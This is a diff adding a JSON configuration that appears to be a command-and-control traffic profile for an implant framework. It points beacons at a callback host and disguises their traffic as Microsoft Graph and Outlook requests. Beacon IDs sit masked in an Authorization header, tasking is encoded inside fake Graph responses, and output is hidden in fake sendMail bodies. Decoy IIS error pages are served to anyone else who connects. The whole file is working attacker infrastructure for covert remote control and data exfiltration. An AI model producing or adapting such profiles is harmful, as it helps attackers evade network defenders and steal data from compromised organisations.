@@ -1,0 +1,125 @@
+{
+  "callbacks": [
+    {
+      "hosts": ["192.168.100.129:7475"],
+      "user_agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)",
+      "beacon_id_header": "Authorization",
+      "rotation": "sequential",
+
+      "server_error": {
+        "status": 401,
+        "body": "{\"error\":{\"code\":\"InvalidAuthenticationToken\",\"message\":\"Access token is empty or invalid.\",\"innerError\":{\"date\":\"2024-12-01T00:00:00\",\"request-id\":\"a1b2c3d4-5678-90ab-cdef-111111111111\",\"client-request-id\":\"a1b2c3d4-5678-90ab-cdef-111111111111\"}}}",
+        "headers": {
+          "Content-Type": "application/json",
+          "Server": "Microsoft-IIS/10.0",
+          "x-ms-request-id": "a1b2c3d4-5678-90ab-cdef-111111111111",
+          "x-ms-ags-diagnostic": "{\"ServerInfo\":{\"DataCenter\":\"West Europe\",\"Slice\":\"SliceC\",\"Ring\":\"5\",\"ScaleUnit\":\"002\",\"RoleInstance\":\"AGSFE_IN_0\"}}",
+          "Connection": "close"
+        }
+      },
+
+      "get": {
+        "uri": [
+          "/v1.0/me/messages?$select=subject,from,receivedDateTime&$top=10",
+          "/v1.0/me/contacts?$select=displayName,emailAddresses&$top=20",
+          "/v1.0/me/events?$select=subject,start,end&$top=15",
+          "/v1.0/me/drive/root/children?$select=name,size,lastModifiedDateTime"
+        ],
+        "client": {
+          "headers": {
+            "Accept": "application/json",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Origin": "https://outlook.office.com",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors"
+          },
+          "metadata": {
+            "format": "hex",
+            "mask": true,
+            "placement": "header",
+            "name": "Authorization",
+            "prepend": "Bearer ",
+            "append": ""
+          },
+          "parameters": {
+            "$select": "subject,from,receivedDateTime",
+            "$top": "10"
+          }
+        },
+        "server": {
+          "headers": {
+            "Content-Type": "application/json",
+            "Server": "Microsoft-IIS/10.0",
+            "x-ms-request-id": "noop",
+            "x-ms-ags-diagnostic": "{\"ServerInfo\":{\"DataCenter\":\"West Europe\",\"Slice\":\"SliceC\",\"Ring\":\"5\",\"ScaleUnit\":\"002\",\"RoleInstance\":\"AGSFE_IN_0\"}}",
+            "Cache-Control": "private",
+            "Access-Control-Allow-Origin": "*"
+          },
+          "output": {
+            "format": "base64url",
+            "mask": true,
+            "placement": "body",
+            "name": "",
+            "prepend": "",
+            "append": "",
+            "empty_response": ""
+          }
+        }
+      },
+
+      "post": {
+        "uri": [
+          "/v1.0/me/sendMail",
+          "/v1.0/me/events",
+          "/v1.0/me/drive/root/children"
+        ],
+        "client": {
+          "headers": {
+            "Content-Type": "application/json",
+            "Accept": "application/json",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Authorization": "Bearer",
+            "Origin": "https://outlook.office.com",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors"
+          },
+          "metadata": {
+            "format": "hex",
+            "mask": true,
+            "placement": "header",
+            "name": "X-Client-Telemetry",
+            "prepend": "",
+            "append": ""
+          },
+          "output": {
+            "format": "base64",
+            "mask": true,
+            "placement": "body",
+            "name": "",
+            "prepend": "{\"message\":{\"subject\":\"Weekly Report\",\"body\":{\"contentType\":\"HTML\",\"content\":\"",
+            "append": "\"},\"toRecipients\":[{\"emailAddress\":{\"address\":\"user@example.com\"}}]},\"saveToSentItems\":true}",
+            "empty_response": ""
+          }
+        },
+        "server": {
+          "headers": {
+            "Content-Type": "application/json",
+            "Server": "Microsoft-IIS/10.0",
+            "x-ms-request-id": "a1b2c3d4-5678-90ab-cdef-111111111111",
+            "x-ms-ags-diagnostic": "{\"ServerInfo\":{\"DataCenter\":\"West Europe\",\"Slice\":\"SliceC\",\"Ring\":\"5\",\"ScaleUnit\":\"002\",\"RoleInstance\":\"AGSFE_IN_0\"}}"
+          },
+          "output": {
+            "format": "base64url",
+            "mask": true,
+            "placement": "body",
+            "name": "",
+            "prepend": "{\"@odata.context\":\"https://graph.microsoft.com/v1.0/$metadata#users\",\"value\":[{\"id\":\"",
+            "append": "\",\"displayName\":\"User\"}]}",
+            "empty_response": "{\"@odata.context\":\"https://graph.microsoft.com/v1.0/$metadata#users\"}"
+          }
+        }
+      }
+    }
+  ]
+}
